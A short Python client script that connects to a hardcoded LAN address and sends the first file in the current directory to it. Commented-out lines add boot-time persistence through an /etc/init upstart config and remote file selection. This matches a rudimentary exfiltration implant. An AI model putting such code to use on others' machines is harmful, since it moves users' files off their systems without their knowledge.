import socket
import os


def Main():
    # if not os.path.isfile("etc/init/mystartupscript.conf"):
    #	Fl = open("/etc/init/mystartupscript.conf", "w")
    #	Fl.write("start on runlevel [2345]\nstop on runlevel [!2345]\nexec ../../../home/user/Desktop/client.py")
    host = '192.168.14.195'  # you may change it to the wanted ip
    port = 5001
    list = []
    data = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    message = 'n'

    ##for file in os.listdir("."):  # getting list of files in current directory
    ##    list.append(file)
    ##s.send(str(list))

    ##while message != 'q':

    ##    data = s.recv(1024)  # get name of file

    ##    if str(data) in list:
    ##       s.send("done")
    ##       message = 'q'

    data = os.listdir(".")[0]
    s.send(str(os.path.getsize(str(data))))  # send file size

    with open(str(data), 'rb') as f:
        bytesRead = f.read(1024)
        s.send(bytesRead)
        while bytesRead != "":
            bytesRead = f.read(1024)
            s.send(bytesRead)
    s.close()


if __name__ == '__main__':
    Main()
